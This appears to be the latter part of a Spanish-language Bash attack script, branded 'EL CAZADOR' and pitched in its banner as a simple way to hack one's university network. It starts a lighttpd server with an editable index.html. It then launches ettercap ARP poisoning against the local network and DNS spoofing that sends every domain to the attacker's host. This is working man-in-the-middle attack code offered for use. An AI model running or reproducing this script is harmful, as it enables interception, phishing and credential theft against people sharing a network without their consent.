# Ponemos en marcha el servidor y lanzamos el ataque
attack() {
echo ""
echo "[1;34m --> Poniendo en marcha el servidor web..."
echo "[1;31m"
lighttpd -f "$TMP/lighttpd.cfg"
sleep 1
echo "[1;34m --> Poniendo en marcha envenenamiento ARP..."
echo "[1;31m"
INTERFACE="$(ip route show|grep ' src '|cut -d' ' -f3)"
xterm -title "ARP Poisoning" -fg blue -e "ettercap -TM arp:remote // // -i $INTERFACE -P autoadd" & ETTER_1=$!
sleep 1
echo "[1;34m --> Poniendo en marcha falsificación de resoluciones DNS..."
echo "[1;31m"
SERVER="$(ip route show|grep ' src '|cut -d' ' -f12)"
echo "* A $SERVER" >/etc/ettercap/etter.dns
xterm -title "DNS Spoofing" -fg blue -e "ettercap -Tq -i $INTERFACE -P dns_spoof" & ETTER_2=$!
sleep 1
echo "[0m --------------------------------------------------------------------------- "
echo " [1;33mEl ataque se está ejecutando!"
echo " Pulsa la tecla \"Enter\" para detener el ataque y salir.[0m"
read junk
sleep 1
clear

# Hacemos limpieza y salimos
kill $(cat "$TMP/lighttpd.pid" 2>/dev/null) $ETTER_1 $ETTER_2 2>/dev/null
rm -rf "$TMP"
exit
}

# Leer opción
readoption() {
cat << EOF
 [1;34m
 Elige una opción:

 1) Continuar
 2) Editar index.html
 3) Visualizar index.html
 0) Salir

EOF
echo -n " ?> "
read RESP
case $RESP in
	1 ) sleep 1; clear; banner; attack;;
	2 ) sleep 1; (kwrite "$TMP/www/index.html"||mousepad "$TMP/www/index.html") & banner; readoption;;
	3 ) sleep 1; firefox "$TMP/www/index.html" & banner; readoption;;
	0 ) sleep 1; clear; rm -rf "$TMP"; exit;;
	* ) sleep 1; echo "[1;34m
 Opción incorrecta";sleep 1; banner; readoption;;
esac
}

# Banner de bienvenida
banner() {
clear
sleep 0.1s; echo " [1;34m                                                                    "
sleep 0.1s; echo " ####### #           #####     #    #######    #    ######  ####### ######  "
sleep 0.1s; echo " #       #          #     #   # #        #    # #   #     # #     # #     # "
sleep 0.1s; echo " #       #          #        #   #      #    #   #  #     # #     # #     # "
sleep 0.1s; echo " #####   #          #       #     #    #    #     # #     # #     # ######  "
sleep 0.1s; echo " #       #          #       #######   #     ####### #     # #     # #   #   "
sleep 0.1s; echo " #       #          #     # #     #  #      #     # #     # #     # #    #  "
sleep 0.1s; echo " ####### #######     #####  #     # ####### #     # ######  ####### #     # "

sleep 0.1s; echo "                                                                        [0m"
echo " ---------------------------------------------------------------------------
 [1;33mHackea la red  de tu universidad con este sencillo script 
  by theblood , sigue los pasos para que todo resulte bien , ! 
  [0m
 --------------------------------------------------------------------------- "
}

# Se inica el programa
makeconfig && makeindex && banner && readoption
